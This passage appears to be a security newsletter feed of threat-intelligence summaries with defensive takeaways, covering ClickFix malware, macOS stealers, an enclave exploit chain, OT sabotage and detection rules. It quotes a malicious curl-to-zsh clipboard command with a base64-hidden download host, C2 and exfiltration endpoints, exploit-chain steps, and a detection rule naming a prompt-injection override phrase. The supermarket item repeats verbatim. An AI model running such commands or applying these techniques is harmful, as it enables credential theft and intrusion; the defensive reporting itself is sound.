- UTA0576 operated entirely through the exploit channel's HTTPS requests, no backdoor or web shell deployed. Every command re-triggered the full chain. Post-exploitation was hands-on and targeted: custom tools written to /tmp/ included ml[.]py and rq5[.]py (LDAPv3 credential harvester querying LAPS passwords, BitLocker recovery keys, and userPassword/unixUserPassword attributes), mk[.]py and rr[.]py (Kerberos/Kerberoast tester), sp_run.py (password spraying), and h[.]py (PCAP parser targeting /data/.icscap/cap* for plaintext LDAP credentials, HTTP Basic Auth, and NTLM hashes). Output was written as zlib-compressed Base64 JSON files in /tmp/ and exfiltrated over the exploit channel. The C2 host observed during this operation was 108.165.147[.]64, an Evoxt VPS running OpenVPN September 30 through October 7, 2026.
- Anti-forensics were deliberate and layered. Log entries were selectively stripped from /home/runtime/dlogs/debuglog and /var/log/audit/audit.log within a targeted time window while preserving older records. Root-stage Perl payloads self-deleted from /home/runtime/tmp/ics-root-run-inband-*.pl. DSCache was restored to point ScriptUtil/updateOpswatSDK back to /home/bin/updateOpswatSDK.pl. The memory patch to libdsplibs[.]so was reversed via /proc/self/mem. A renamed tcpdump binary, dsstatmond, ran from the hidden directory /data/.icscap/ with eight rotating capture files. Normal filesystem listings do not surface this directory.
- The packet sniffer (dsstatmond, PID 5012 in this case) was recovered from memory analysis and showed BPF filters capturing LDAP (389), HTTP, FTP, and Telnet traffic. Memory analysis also recovered the Python scripts, output JSON files, and PCAP data that disk-based forensics would have missed entirely. Affected versions span 25.1.1 and prior, 25.1.2, and 22.8R2.4 (Build 19097). Exploitation began October 3, two days before discovery, on a fully patched appliance.
Practitioners: do not rely on the Ivanti Integrity Checker to rule out compromise here. Hunt /tmp/ for the named scripts (ml[.]py, rq5[.]py, mk[.]py, rr[.]py, sp_run.py, h[.]py) and check /data/.icscap/ for dsstatmond and cap* PCAP files. In network logs, flag high volumes of requests to /dana-na/auth/url_default/welcome.cgi and inspect for X-DSCGI-PATH headers pointing to wu.cgi or /home/runtime/tmp/ paths. If you have a memory image, file descriptors and process trees will surface what disk won't. IOCs are on the Volexity GitHub page.

item.title: AI Security Incident Case: Fake Claude Installation Page Delivered Malware via ClickFix
item.description:
ClickFix malvertising campaign abused Google Ads and Bing's own redirect infrastructure to deliver a fake Claude installer to macOS users, with two-layer cloaking that blocked every automated scanner from seeing the payload.
Key details:
- The redirect chain runs four hops: Google's ad click redirect (302) to a Bing click-tracking URL at bing[.]com/ck/a (200, JavaScript-forwarded, leaving a bing[.]com referrer), then to a compromised South American retailer's "About us" page at homeopatiaalemana[.]com/quienes-somos/ (302), and finally to the fake Claude site at claude-desk-code[.]com (200). Ad platform reviewers only ever saw bing[.]com as the landing domain, because Bing's own tracking redirect is a legitimate, recognizable URL.
- Two cloaking layers protected the payload from analysis. The first lives server-side on the compromised WordPress retailer: it checks for a Bing referrer plus valid browser headers and returns a 302 to the next hop only when both are present. The second lives on the fake Claude site as JavaScript that reads document.referrer and redirects any visit without a Google or Bing referrer to /404.html. Sandboxes and URL scanners hitting either URL directly receive a 404, making sample capture through automated tooling effectively impossible.
- The clipboard deception is the core ClickFix mechanic here. The page displays Anthropic's real command (curl -fsSL hxxps://claude[.]ai/install.sh | bash) so the user reads something legitimate. The Copy button writes an entirely different command: echo "Downloading Claude: hxxps://claude[.]ai/install.sh" && curl -s $(echo "aHR0cHM6Ly9sYWtlLTkwLmNvbS9jdXJsL2luaGd1cDlhL2E5MGZrYnFkZzhkMG11czY0b2g4ZHcuZGF0" | openssl base64 -d -A) | zsh. The terminal prints a believable Claude URL before base64-decoding a hidden address at lake-90[.]com and piping the fetched script directly into zsh under the victim's own account permissions.
- Push Security groups the infrastructure behind this campaign under the toolchain name AcSig, noting consistent macOS command patterns, payload URL structures, and installation popup code across related domains, suggesting a mature operation capable of swapping domains at scale. The final payload remains unconfirmed, which complicates targeted remediation and damage assessment for any macOS users who executed the command.
Practitioner takeaway: Domain reputation blocking fails completely here because every hop is a legitimate domain. The forensic opportunity sits at the endpoint: look for zsh or bash processes spawned from a terminal session that made an outbound curl or fetch to lake-90[.]com, and cross-reference with clipboard write events captured by browser or endpoint telemetry. On macOS, shell history files (~/.zsh_history, ~/.bash_history) and the unified log (subsystem com[.]apple.bash or com[.]apple.zsh) may retain the full decoded command even if the user did not notice what ran. Hunt for base64 decode operations chained with pipe-to-shell patterns in process telemetry. IOCs and campaign detail are in the Push Security report.

item.title: French Supermarket Cyberattack: Exposed OT Behind France’s Food Supply
item.description:
Attackers forced Danfoss refrigeration controllers across hundreds of French 🇫🇷 supermarkets into 50°C defrost cycles overnight, spoiling stock, starting fires, and causing tens of millions in losses. The intrusion method remains unknown, but thousands of the same management interfaces were internet-exposed at the time.
Key findings:
- Overnight October 11 to 12, 2026, refrigeration controllers at stores belonging to Intermarché, Netto, Coopérative U, Carrefour, Monoprix and E[.]Leclerc were remotely forced into defrost mode for roughly six hours, reaching 50°C. Les Mousquetaires CEO Thierry Cotillard estimated losses in the tens of millions of euros across France 🇫🇷 alone. A single Intermarché and Super U store in Haguenau lost €270,000. Paris prosecutors opened an investigation led by OFAC. Spillover was reported in Spain 🇪🇸, Portugal 🇵🇹, Poland 🇵🇱, Germany 🇩🇪 and Belgium 🇧🇪.
- Danfoss named two affected models: the AK-SM 800 (end of life May 2021) and AK-SC 355 (phased out 2016), neither of which receives security updates. Some current AK-SM 800A units running outdated firmware were also hit. Retailers framed the incident as a supplier-side compromise, with Les Mousquetaires noting the systems were under Danfoss's management. CERT-FR issued alert CERTFR-2026-ALE-012 on October 12, confirming numerous compromises and ordering operators to disconnect or tightly filter access to AK-SM and AK-SC controllers.
- Three vulnerabilities disclosed by Claroty Team82 in August 2026 affect the AK-SM 800A: CVE-2025-41450, a hidden authentication bypass with a CVSS v3 score of 8.2, fixed in firmware 4.2; CVE-2025-41451, a command injection via SMTP alarm-to-mail settings leading to post-authentication RCE, CVSS 7.6, fixed in R4.3.1; and CVE-2025-41452, an Nginx configuration injection causing denial of service, CVSS 5.4, fixed in R4.3.1. No authority or vendor has linked these CVEs to this incident, and Claroty's research covered only the AK-SM 800A, not the two end-of-life models Danfoss named. The intrusion path has not been disclosed.
- On October 13, SOCRadar found 2,898 Danfoss StoreView results in France 🇫🇷 on Shodan and 881 unique hosts on Censys, representing roughly 65% of exposed StoreView interfaces worldwide. Exposure is not confirmed as the entry point, but the same fingerprint Claroty highlighted in its August research was used. Danfoss's own newsletter recorded attacks on AK-SM 800 systems at 16 Russian 🇷🇺 and 40 Israeli 🇮🇱 supermarkets in 2022, all 40 Israeli 🇮🇱 sites lacking firewall or VPN protection. This attack vector is not new; the scale is.
- Pro-Russian hacktivist group NoName057(16) is running active OpFrance DDoS operations this week against French 🇫🇷 defense, energy and government targets, and separately claimed HMI manipulation at a small unnamed French 🇫🇷 hydroelectric plant via a Weintek interface. Neither claim mentions the supermarket attack, and no link to it has been established. The unattributed nature of the supermarket incident, surrounded by hacktivist claims of OT access, creates deliberate ambiguity that itself serves disruption objectives regardless of who is responsible.
Practitioner takeaway: CERT-FR's alert CERTFR-2026-ALE-012 is the immediate action anchor. For OT defenders, the hunt starts with your asset inventory: identify any Danfoss AK-SM or AK-SC management interfaces and treat anything exposed or contractor-accessible as potentially compromised. CERT-FR advises factory resetting affected devices, rotating all credentials, auditing accounts and reconfiguring completely before returning to service. For the AK-SM 800A, confirm firmware is at the latest 5.3.x release, stepping through 4.x if upgrading from 3.x. Audit every refrigeration contractor holding remote access, verify what network path they use to reach controllers, and check for co-located VNC or RDP services on the same segment. Independent out-of-band temperature sensors are a direct detection control here: a compromised controller can misreport its own state, and a secondary alarm source is what tells you something is wrong before product is lost.

- Overnight October 11 to 12, 2026, refrigeration controllers at stores belonging to Intermarché, Netto, Coopérative U, Carrefour, Monoprix and E[.]Leclerc were remotely forced into defrost mode for roughly six hours, reaching 50°C. Les Mousquetaires CEO Thierry Cotillard estimated losses in the tens of millions of euros across France 🇫🇷 alone. A single Intermarché and Super U store in Haguenau lost €270,000. Paris prosecutors opened an investigation led by OFAC. Spillover was reported in Spain 🇪🇸, Portugal 🇵🇹, Poland 🇵🇱, Germany 🇩🇪 and Belgium 🇧🇪.

- Danfoss named two affected models: the AK-SM 800 (end of life May 2021) and AK-SC 355 (phased out 2016), neither of which receives security updates. Some current AK-SM 800A units running outdated firmware were also hit. Retailers framed the incident as a supplier-side compromise, with Les Mousquetaires noting the systems were under Danfoss's management. CERT-FR issued alert CERTFR-2026-ALE-012 on October 12, confirming numerous compromises and ordering operators to disconnect or tightly filter access to AK-SM and AK-SC controllers.

- Three vulnerabilities disclosed by Claroty Team82 in August 2026 affect the AK-SM 800A: CVE-2025-41450, a hidden authentication bypass with a CVSS v3 score of 8.2, fixed in firmware 4.2; CVE-2025-41451, a command injection via SMTP alarm-to-mail settings leading to post-authentication RCE, CVSS 7.6, fixed in R4.3.1; and CVE-2025-41452, an Nginx configuration injection causing denial of service, CVSS 5.4, fixed in R4.3.1. No authority or vendor has linked these CVEs to this incident, and Claroty's research covered only the AK-SM 800A, not the two end-of-life models Danfoss named. The intrusion path has not been disclosed.

- On October 13, SOCRadar found 2,898 Danfoss StoreView results in France 🇫🇷 on Shodan and 881 unique hosts on Censys, representing roughly 65% of exposed StoreView interfaces worldwide. Exposure is not confirmed as the entry point, but the same fingerprint Claroty highlighted in its August research was used. Danfoss's own newsletter recorded attacks on AK-SM 800 systems at 16 Russian 🇷🇺 and 40 Israeli 🇮🇱 supermarkets in 2022, all 40 Israeli 🇮🇱 sites lacking firewall or VPN protection. This attack vector is not new; the scale is.

- Pro-Russian hacktivist group NoName057(16) is running active OpFrance DDoS operations this week against French 🇫🇷 defense, energy and government targets, and separately claimed HMI manipulation at a small unnamed French 🇫🇷 hydroelectric plant via a Weintek interface. Neither claim mentions the supermarket attack, and no link to it has been established. The unattributed nature of the supermarket incident, surrounded by hacktivist claims of OT access, creates deliberate ambiguity that itself serves disruption objectives regardless of who is responsible.

Practitioner takeaway: CERT-FR's alert CERTFR-2026-ALE-012 is the immediate action anchor. For OT defenders, the hunt starts with your asset inventory: identify any Danfoss AK-SM or AK-SC management interfaces and treat anything exposed or contractor-accessible as potentially compromised. CERT-FR advises factory resetting affected devices, rotating all credentials, auditing accounts and reconfiguring completely before returning to service. For the AK-SM 800A, confirm firmware is at the latest 5.3.x release, stepping through 4.x if upgrading from 3.x. Audit every refrigeration contractor holding remote access, verify what network path they use to reach controllers, and check for co-located VNC or RDP services on the same segment. Independent out-of-band temperature sensors are a direct detection control here: a compromised controller can misreport its own state, and a secondary alarm source is what tells you something is wrong before product is lost.

item.title: Introducing macOS Mirage: Next-Generation Apple Silicon Dynamic Analysis and Sigma Detections
item.description:
VirusTotal's macOS Mirage sandbox brings native Apple Silicon ARM64 detonation, kernel-backed telemetry, and mapped Sigma rules to macOS malware analysis, replacing the decade-old Box of Apples Intel sandbox.
Key findings:
- The sandbox runs on bare-metal Apple Silicon with macOS 26, supporting ARM64 and Universal Mach-O binaries, .dmg, .pkg, .app, .sh, .py, and PDFs. Behavioral telemetry is captured via modern kernel-supported macOS security instrumentation rather than the legacy dtrace hooks that SIP restrictions and high syscall volumes made unreliable. Monitored locations include LaunchAgents, LaunchDaemons, Login Items, cron jobs, .zshrc/.bashrc/.zshenv, login.keychain-db, browser credential stores, SSH keys, TCC.db, the hosts file, /etc/resolv.conf, and /private/etc/sudoers.
- The report walks through a real macOS infostealer detonation (SHA-256: be77bca22f078d57058535ddcf26a39a752a8df030392cb45ba6a60e06651878, 6/76 static AV detections) that executes a full credential theft and persistence chain: osascript phishing dialog ("set passwen to display dialog"), dscl authonly password validation, LaunchDaemon persistence to /Library/LaunchDaemons/com.somedaemon.plist, Keychain and Safari cookie harvesting, Apple Notes and SSH key staging under /tmp/lksopo, clipboard polling via pbpaste, ditto compression to /tmp/lksopo.zip, HTTP POST exfiltration to 109.238.87[.]111, secondary bot download from 193.178.159[.]129/web/bot (f7dcdc4167ec267aef007f9d5f98e9e0314185e5355effd3e304b6fa686ea84c), and rm -rf cleanup of the staging directory.
- That single detonation triggered 7 Sigma rules spanning the full attack lifecycle: macos_osascript_credential_phishing (High, T1059.002/T1056.002), macos_sensitive_credential_store_access (High, T1555.001/T1555.003/T1005), macos_esf_sensitive_file_access (High, T1555.001/T1555.003/T1005), macos_esf_suspicious_curl_download (Medium, T1105/T1071.001), macos_network_upload_activity (Medium, T1041/T1567), macos_data_destruction_tools (Medium, T1485/T1070.004), and macos_http_tools_with_protocol_indicators (Low, T1071.001/T1105). The dropped LaunchDaemon plist (d7dd630f67e03d2945185838dca887211ea3693c91fc0bd0d2e257948bb3b678) had 0/75 AV detections, and the second-stage bot exits immediately in isolation because it depends on hidden state files (.bhost, .phost, .username, .pwd) written by the first stage.
- The report provides VirusTotal Intelligence hunt queries across four pivot categories: behaviour_processes for command-line patterns like "curl -X POST -H buildid:", "set passwen to display dialog", and "ditto -c -k --sequesterRsrc /tmp/"; behaviour_files for hidden state files (.bhost, .phost, .binaryexe) and the LaunchDaemon plist path; behaviour_network for C2 IPs 109.238.87[.]111 and 193.178.159[.]129 and the /api/v1/bot/joinsystem endpoint; and sandbox/Sigma/ATT&CK pivots including sandbox_name:"VirusTotal MacOS Mirage" attack_technique:T1555.001 type:macho and sigma_rule:b8017658b8eef8b1293176d76212e600b660d0a36a4f5dc80141324fae360bbf.
Practitioner takeaway: if you are triaging macOS samples, the multi-stage dependency problem is real: the second-stage bot in this cluster exits clean in isolation because it needs first-stage state files on disk. let you pivot on runtime command lines, dropped artifacts, C2 URIs, and Sigma verdict names across the full campaign cluster without needing static signatures. The IOCs and VTI query strings are in the report.

item.title: Playing It SFAPE: Code Execution in Isolated User Mode
item.description:
CVE-2026-83498 patched September 2026: a four-byte fixed-value write in Windows 11's SFAPE.dll VBS enclave escalates to full Isolated User Mode code execution inside lsass.exe, breaking Credential Guard's core isolation promise.
Key findings:
- The root bug is in SFAPE.dll's exported Initialize function. After the enclave is legitimately initialized, a repeated call writes the fixed DWORD 0xC0000510 (STATUS_ALREADY_INITIALIZED) to request+0x30 with no address validation, giving an attacker a constrained write primitive targeting any 4-byte-aligned location in VTL1 or VTL0 memory. The vulnerable build is SFAPE.dll 10.0.26100.8875 (SHA-256: AEFEDEB6A7F84679C192D3C19F6C08C3E508222574AE5C9E3D0E10FD2DECE4AF); the patch landed in 10.0.26100.9444 via KB5124008 on September 8, 2026.
- The four-byte write corrupts the high DWORD of the cached g_enclaveBase pointer stored at SFAPE image RVA 0xE86C. This destroys the IsInsideEnclave range check used by all other exports, opening a TOCTOU path in ClipboardInput: the host process swaps the UNICODE_STRING Buffer and Length fields between the enclave's validation step and its final SecureZeroMemory call, converting the primitive into a controlled memset(ptr, 0, length) anywhere in VTL1.
- With the memset primitive, the attacker pivots the credential-context red-black-tree map pointer stored at SFAPE RVA 0xE064 into a VTL0-resident synthetic tree node. This grants a 16-byte VTL1 read (via GetCcAttributes) and a 64-bit VTL1 write (via SetCcTimeStamps), which are used to replace the VertValidTargetTable (VTT) in vertdll, the list of approved CallEnclave targets. Replacing the VTT authorizes arbitrary existing VTL1 functions and ROP gadgets, bypassing VTL1 Arbitrary Code Guard.
- NtContinue is then added to the replacement VTT and called via CallEnclave to restore a controlled CONTEXT structure (RIP, RSP, RCX, RDX, R8, R9) captured earlier with RtlCaptureContext. This gives full multi-argument calling convention control over existing VTL1 code, confirmed by exercising vertdll functions with verified argument and return-value control. The Secure Kernel syscall 0x08000019 (EnclaveCopyIntoEnclave / EnclaveCopyOutOfEnclave, at vertdll RVAs 0x4090 and 0x40B0) then provides clean arbitrary VTL1 read/write without the earlier constraints.
- The host process for SFAPE.dll is SFAPM.dll, an LSA package loaded by lsass.exe as NT AUTHORITY\SYSTEM. LSA protection is on by default on Windows 11, but an attacker already inside lsass or able to load a crafted enclave host can weaponize this chain. The patched VbsSiPolicy.p7b now blocks all older SFAPE.dll images via VBS Code Integrity policy, so rollback to the vulnerable build is prevented. The vulnerable Edge prefs_enclave_x64.dll (CVE-2023-36880, CVE-2024-21423) remains unblocked by the current policy despite comparable impact.
Takeaway: If you are investigating a system running unpatched Windows 11 builds before KB5124008, examine lsass.exe for unexpected enclave allocations and audit which enclave DLLs are loaded into it. Look for anomalous CallEnclave traffic patterns in ETW or kernel telemetry around the SFAPM LSA package. Confirm VbsSiPolicy.p7b has been updated: an outdated policy file is a reliable indicator that older, vulnerable enclave images can still load. The full exploit chain details, decompilation, and RVA offsets are in the Doyensec report.

item.title: Inside ICMacOS: From an Infostealer to a Persistent RAT
item.description:
ICMacOS (Icarus macOS), a new macOS MaaS stealer marketed by Russian-speaking actor GlowComa, evolved from credential theft into a persistent WebSocket RAT within weeks of its September 2026 launch.
- GlowComa promotes ICMacOS on XSS, Exploit[.]in, and Rehub forums under the MADHASH crypto-draining affiliate group, bundling it with an Icarus ClickFix social engineering panel and a multi-chain crypto clipper. Subscriptions run $699/week to $1,699/month. The actor enforces a hard CIS geo-lock, checking locale | grep -c ru_RU and querying ipinfo[.]io/country before proceeding, a standard Russia-aligned MaaS safeguard.
- Infection starts with a ClickFix paste-into-terminal lure (T1204.004). A Bash dropper fetches from hxxps[://]escapeai[.]live/icmacos_run_v2[.]command, strips Terminal window titles via com[.]apple.Terminal preference edits to hide activity (T1564), then uses osascript to spawn a fake "System Preferences" dialog capturing the login password (T1056.002). It validates the captured password directly against login.keychain-db with security unlock-keychain, allows five attempts, then downloads the architecture-matched Mach-O payload from hxxps[://]escapeai[.]live/ICMacOs?arch={arm64|amd64} and kills the Terminal window. Execution details log to /tmp/.update-helper.log.
- Version 1 is a Go-compiled 64-bit Mach-O stealer covering: AES-128 Keychain-extracted browser master keys across Chromium, Gecko, and Safari; 29 browser extension IDs including MetaMask, Phantom, 1Password, and LastPass; desktop wallets across 20+ applications; Telegram tdata including key_data for offline session hijack; Discord LevelDB tokens; iMessage chat.db; and developer secrets covering .ssh/, .aws/credentials, .kube/config, .env files, and shell histories. Data archives to /tmp/.systemd-private-helper.zip and exfiltrates via HTTPS POST to hxxps[://]escapeai[.]live/upload (T1048.002).
- Version 2 adds full RAT capability. It installs ~/Library/LaunchAgents/com.apple.systemupdater.plist (T1543.001), loaded immediately via launchctl bootstrap gui/{uid}, with KeepAlive and StartInterval 3600 for hourly restart. It opens a persistent WebSocket to wss[://]escapeai[.]live/ws?mac_id={hostname}&username={username} via the Gorilla library, executing operator commands through /bin/sh in real time. New collection targets include Steam .ssfn SteamGuard bypass tokens, Outlook .olk15 cache, clipboard via pbpaste (T1115), and expanded password manager directories. A supplementary Python payload at hxxps[://]escapeai[.]live/payload[.]py covers Slack, Signal, Zoom, VPN configs, and a filegrabber targeting Desktop/Documents/Downloads for .pdf, .xlsx, .json, .key, and .csv files (T1213).
- The developer-credential targeting, SSH keys, AWS, Kubernetes, Docker, Terraform, and .env files, creates direct supply chain exposure from a single infected developer Mac into broader enterprise cloud and pipeline infrastructure. 16 dropper SHA256 hashes, 4 Mach-O and Python payload hashes, C2 domains escapeai[.]live and mikoblico[.]xyz, and IPs 85.137.253[.]61 and 45.13.186[.]247 are in the IOC table of the SOCRadar report.
Hunt for com[.]apple.systemupdater.plist under ~/Library/LaunchAgents/, hidden files /tmp/.update-helper.log and /tmp/.cache-update.log, ZIP archives in /tmp with dot-prefixed names, and outbound connections to escapeai[.]live or wss:// traffic to that host. On macOS, launchctl list | grep systemupdater and reviewing unified logs for osascript spawning security binary calls will surface this chain early.

item.title: CloudKeyVaultEvents: Azure Key Vault Logs, Schema and KQL Hunting
item.description:
Undocumented Azure Key Vault hunting table found in Microsoft Defender Advanced Hunting: CloudKeyVaultEvents exposes vault, key, secret, and certificate operations with identity and network context, enabled through Microsoft Defender for Key Vault at $0.25/vault/month.
Key findings:
- CloudKeyVaultEvents is a largely undocumented table in Microsoft Defender Advanced Hunting, ingested automatically when the Microsoft Defender for Key Vault plan is enabled. No Azure Monitor diagnostic settings are required. The table surfaces 70+ distinct operation types across vaults, keys, secrets, and certificates, including SecretGet, KeyDecrypt, KeyUnwrap, SecretList, AccessPolicyMerge, and SecretPurge. Disabling the Defender for Key Vault plan stops ingestion entirely, so coverage gaps are a real risk in environments with inconsistent plan deployment. Run CloudKeyVaultEvents | distinct AzureResourceId | count against an Azure Resource Graph query for microsoft.keyvault/vaults to identify vaults not sending logs.
- For hunting credential access and enumeration, the report provides two KQL queries worth operationalizing. The first joins EntraIdSignInEvents on RiskLevelDuringSignIn (10, 50, or 100) to CloudKeyVaultEvents using UniqueTokenIdentifier from AdditionalFields, connecting a risky authentication event directly to the vault operation it produced. The second summarizes enumeration operations (SecretList, KeyList, CertificateList and their variants) and read operations (SecretGet, KeyGet, CertificateGet) per AccountObjectId to surface bulk access patterns. Both queries are in the report alongside a more detailed enumeration variant on the author's GitHub.
- Forensic enrichment during an incident pivots on the UniqueTokenIdentifier field inside AdditionalFields. Joining CloudKeyVaultEvents to EntraIdSignInEvents (for users) or EntraIdSpnSignInEvents (for service principals) on this token identifier links the vault operation back to the authentication event, giving you sign-in risk, source IP, user agent, and location in a single record. This is the key forensic thread: Key Vault access without a corresponding sign-in, or access following a sign-in from an anomalous location or with a risky token, is a meaningful escalation signal.
- The schema includes IPAddress, UserAgentHeader, HttpStatusCode, AccountType, AccountObjectId, AccountUpn, AccountApplicationId, AzureResourceId, and VaultName. HttpStatusCode is particularly useful for distinguishing denied attempts from successful access. A pattern of 401 or 403 responses followed by a 200 on SecretGet or KeyDecrypt is an investigative flag. AdditionalFields carries extended context including the token identifier, and the report notes that some field names such as CountryCode, ISP, and IsAnonymousProxy may appear depending on the schema exposed in your environment.
Validate ingestion coverage first: confirm your Defender for Key Vault plan is enabled across all subscriptions and cross-check vault counts with Azure Resource Graph before deploying detections. The KQL hunting queries, simulation scripts, and Azure Resource Graph examples are published on the author's GitHub.

item.title: Open Sesame: How a Fail-Open Bug in Open VSX's New Scanner Let Malware Walk Right In
item.description:
A fail-open logic flaw in Open VSX's pre-publish scanner let any authenticated publisher flood the API, exhaust the database connection pool, and push uninspected malicious extensions directly to the marketplace with a "PASSED" status.
Key details:
- The root cause lives in ExtensionScanService[.]java: a single boolean return value could not distinguish between "no scanners configured" (safe, legitimate) and "all scanner jobs failed to enqueue" (unsafe, error). PublishExtensionVersionHandler[.]java treated both as the former and activated the extension. The recovery path in ExtensionScanJobRecoveryService[.]java carried the same flaw, so the safety net had the same hole. CWEs assigned: CWE-636, CWE-755, CWE-362, and CWE-400.
- Exploitation required only a standard publisher account, no elevated privileges. An attacker prepared malicious .vsix packages and flooded the publish endpoint concurrently. Each publish attempt competes for database connections from a shared pool. Under sufficient load, jobScheduler.enqueue() throws exceptions that are caught and logged but not acted on. enqueuedCount stays at zero, the method returns false, and the extension goes live. No rate limiting existed on the publish endpoint, meaning retries cost the attacker nothing.
- The activated extension was indistinguishable from a legitimately scanned one. The marketplace UI showed scan status: PASSED. Developers in Cursor, Windsurf, and VSCode-fork environments downloading extensions from open-vsx[.]org had no signal that any security check had been skipped. This affects the software supply chain for a broad set of developer toolchains, not a single target.
- Disclosure was February 8, 2026. The Open VSX team acknowledged on February 11 and shipped fix commit 64720cc the same day, three days from initial report. The fix removes the ambiguous boolean and makes failure states explicit: failure returns failure, not a benign "nothing to do."
DFIR and supply chain security takeaway: if your organization consumes Open VSX extensions, review extensions installed from open-vsx[.]org between roughly late 2025 (when the scanning pipeline launched) and February 11, 2026, particularly those installed in developer workstations running Cursor, Windsurf, or VSCode forks. Extensions that show "PASSED" in that window may have bypassed all scanning. Hunt for unexpected network connections or process executions spawned by the extension host process, and verify installed extension hashes against the post-fix re-scanned versions. For teams building similar pipelines: never let "no work needed" and "work failed" share a return value. Make every failure state explicit and fail-closed.

item.title: Wordfence Argus Discovers Critical Vulnerability in Ghostscript, the Program That Turns Uploaded PDFs into Thumbnails on Your Server
item.description:
CVE-2026-39919 (CVSS 9.8): Critical heap buffer overflow in Ghostscript 9.21-10.07.1 enables unauthenticated RCE via crafted PDF upload, confirmed on a live WordPress deployment with -dSAFER sandbox enabled.
Key findings:
- The flaw lives in Ghostscript's JPEG 2000 decoding path, specifically how it handles sub-byte sample precision with mismatched component resolutions. A 1,029-byte crafted PDF, differing from a harmless control file by a single byte in the transparency component's resolution field, triggers the loop to write 1,024 bytes into a 256-byte heap buffer, spilling 768 bytes of attacker-influenced data into adjacent memory management structures. Standard file extension, MIME type, and structure checks do not flag it. The -dSAFER sandbox does not prevent the memory corruption. Affected versions span Ghostscript 9.21 through 10.07.1 wherever the OpenJPEG decoder is present. All ten package environments tested on September 15 contained that path.
- The WordPress attack chain is: anonymous visitor submits a PDF via an upload form, WordPress passes it through the Imagick PHP extension, Imagick calls ImageMagick, ImageMagick launches Ghostscript to render a preview. WordPress core retries the conversion with a different setting if the first attempt fails, meaning a crashing PDF triggers two Ghostscript processes per upload. The vulnerability is not in WordPress or any plugin. Ghostscript is a system-level dependency most site owners do not know they are running.
- Exploit portability testing ran 10,240 attempts across ten Linux environments (Debian, Ubuntu, Fedora, AlmaLinux, Alpine, and the official WordPress Docker image). Neither proof-of-concept succeeded once outside the build it was prepared for. However, when the Ghostscript executable was held constant and fonts, locale, font configuration, and one core library were varied, the exploit still succeeded across all four matching setups, though not on every attempt. The credible threat model is targeted attacks against a known build, or a single exploit sweeping many servers sharing one hosting or container image.
- As of September 15, every tested platform was vulnerable: the official WordPress Docker image (10.05.1~dfsg-1+deb13u1), Debian 13 trixie, Debian 12 bookworm, Ubuntu 22.04/24.04/26.04, Fedora 44, AlmaLinux 10, Alpine 3.22 and 3.23. Ubuntu has since shipped fixes for 22.04, 24.04, and 26.04. AlmaLinux 10 fixed on October 2. As of October 9, Fedora 44 and Alpine 3.22/3.23 still listed the older revisions. Debian 12 remains listed as vulnerable. No public exploitation has been observed as of the report's publication.
- Wordfence notes that a failed exploit attempt returns a successful HTTP upload response while Ghostscript crashes silently in the background. Logs may show Ghostscript process crashes or OOM events rather than an obvious attack signal. The number of Ghostscript processes spawned per upload is measurable: one for a harmless PDF, two for a crashing one. This gives a detection ratio to watch. The scope extends well beyond WordPress: document management systems, print services, invoice processors, mail gateways, and conversion APIs are all in scope if they pass untrusted PDFs to an unpatched Ghostscript build.
Practitioner takeaway: gs --version is not sufficient to confirm patch status. On Debian/Ubuntu check the full package revision with dpkg -s ghostscript; on Fedora/Red Hat family use rpm -q ghostscript and compare against your distribution's advisory for CVE-2026-39919. For containers, rebuild from an updated base image without relying on cached layers. Monitor process logs for unexpected Ghostscript crashes tied to upload activity, particularly two-process sequences per submission. If patching is not immediately possible, block untrusted PDF uploads at the application layer or disable PDF reads in ImageMagick's security policy as a temporary measure, understanding both disable preview functionality.

item.title: Detections Digest #20261012
item.description:
Weekly detection rule roundup covers 78 rule changes across 8 repos, with highlights spanning KerberLoss AD exploitation, BYOVD kernel bypass, AI prompt injection, and a wave of SaaS-abusing phishing coverage.
This week's Detections Digest (Oct 5-12 2026) tracked 50 new rules and 28 updates. Here is what matters for defenders:
- KerberLoss (CVE-2026-25177) gets Splunk coverage via two new rules monitoring Windows Security Event 5136. One flags SPNs written with invisible Unicode characters to trigger Kerberos denial-of-service and force NTLM fallback. The other catches standard user accounts modifying SPN attributes on computer objects, a sign of unauthorized delegated Kerberos manipulation. If you are not auditing Event 5136 for Directory Service Changes, this campaign will be invisible to you. Splunk also shipped four rules comparing executing process names against PE header OriginalFileName metadata to catch renamed cmd.exe, powershell.exe, LOLBAS, and Python binaries, a technique that bypasses name-only detection logic entirely.
- LOLDrivers refreshed hash sets (MD5, SHA1, SHA256, IMPHASH) across three rules monitoring Windows driver load events for BYOVD attacks. Critically, coverage now explicitly includes drivers capable of bypassing HVCI. If your environment relies on HVCI as a control boundary, hunting driver loads by name and hash against this updated list is a priority step.
- Two new Sigma rules from SigmaHQ target a PowerShell evasion technique where adversaries index into the ExportedCommands array of Microsoft.PowerShell.Utility to invoke cmdlets like Invoke-RestMethod and Invoke-Expression without typing the command string. String-based detections and many script block logging parsers miss this pattern. Coverage targets both command-line arguments and script content, so both sources matter for hunting.
- AI-targeted detections appeared in two repos. Agent-Threat-Rule added a rule for goal hijacking prompt injection, combining regex for temporal override directives ("ignore previous/following instructions") with a semantic judge model for OpenAI GPT-4 environments. KQL rules from cyb3rmik3 hunt email-borne prompt injection by correlating EmailEvents with EmailUrlInfo to surface delivered links with paths like /collect, /exfil, or /log alongside long encoded parameters. This is early-stage coverage for a real attack surface.
- sublime-security/sublime-rules dominated volume with 37 new rules and 14 updates. Key additions target Google Cloud Storage URL fragment structures used as phishing lure delivery, open redirects on toradex[.]com, Quickbase, Staples SSO, info.nsf[.]org, and newslit[.]co, and PDF credential harvesters using base64-encoded query parameters to evade link parsers. Updated rules for Amazon, Microsoft Teams, MetaMask, LinkedIn, and Meta impersonation add OCR, NLU entity extraction, and DMARC validation to reduce false negatives.
Practitioner takeaway: prioritize Event 5136 audit policy validation and pull the new LOLDrivers hash lists into your driver load monitoring now. For the PowerShell ExportedCommands technique, hunt script block logs (Event 4104) for array indexing patterns against the Microsoft.PowerShell.Utility module. IOCs and rule links are in the digest.
